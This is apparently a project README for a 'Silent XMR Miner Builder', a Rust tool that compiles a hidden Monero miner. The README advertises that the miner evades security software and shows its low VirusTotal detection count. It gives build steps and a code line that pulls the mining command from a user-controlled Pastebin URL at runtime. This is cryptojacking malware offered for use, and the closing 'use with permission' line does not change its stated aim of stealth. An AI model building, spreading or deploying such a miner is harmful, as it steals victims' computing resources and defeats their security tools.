# Silent XMR Miner Builder

Welcome to the **Silent XMR Miner Builder**! This tool lets you create a stealthy miner for Monero (XMR), which runs quietly in the background and is designed to avoid detection by security software. The builder allows you to customize and build your own miner executable, which you can configure to mine using your specific Pastebin commands.


## Features:
- **Silent Operation**: The miner runs in the background with minimal system resource usage, avoiding detection.
- **3 Detection on virus tottal**: [https://www.virustotal.com/gui/file/fe23ce5ded67a1c139300b3068166dccf0bcd8c2350e3b882a4e756473651d57](https://www.virustotal.com/gui/file/fe23ce5ded67a1c139300b3068166dccf0bcd8c2350e3b882a4e756473651d57)
- **Free to Use**: The miner builder is open-source and available at no cost.
- **Custom Configuration**: Users must create their own Pastebin for the mining command configuration.

## Prerequisites:
To build and run this project, you need to have **Rust** and **Cargo** installed on your machine.

### Installing Rust:
1. **Download and Install Rust**:
   - Go to the official Rust installation page: [https://www.rust-lang.org/tools/install](https://www.rust-lang.org/tools/install).
   - Follow the instructions for your operating system. Rust can be installed via **rustup**, a tool that helps manage Rust versions and associated tools.
## Verify Installation:

After installation, check that Rust is installed properly by running this command:

```bash
rustc --version
```
You should see something like this:

```bash
rustc 1.65.0 (897e37553 2022-11-02)
```
### Clone the Repository:

First, clone this repository to your local machine using Git and navigate into the project directory.
```bash

git clone https://github.com/yourusername/silent-xmr-miner.git
cd silent-xmr-miner
```

### Create Your Pastebin:

Go to Pastebin and create a new paste with your XMRig mining command. This will include things like the pool address and your wallet address.
Once your paste is created, copy the raw URL.
For example, your URL might look like this:
`https://pastebin.com/raw/yourpastebinid`

### Update the Code:

Open the source code file and replace the URL in the specified line with your own Pastebin link.

```bash
let process_config = client.get("https://pastebin.com/raw/yourpastebinid")
    .send()
    .unwrap()
    .text()
    .unwrap_or_default();
```

### Build the Project:

In the terminal, inside the project directory, run the build command to compile the project in release mode.
```bash
cargo build --release
```

## A Few Important Things to Keep in Mind:

- **Customization**: Make sure your Pastebin contains the correct configuration for XMRig to mine with your pool address and wallet.
- **Be Responsible**: Only use this tool on systems where you have permission to run mining software.
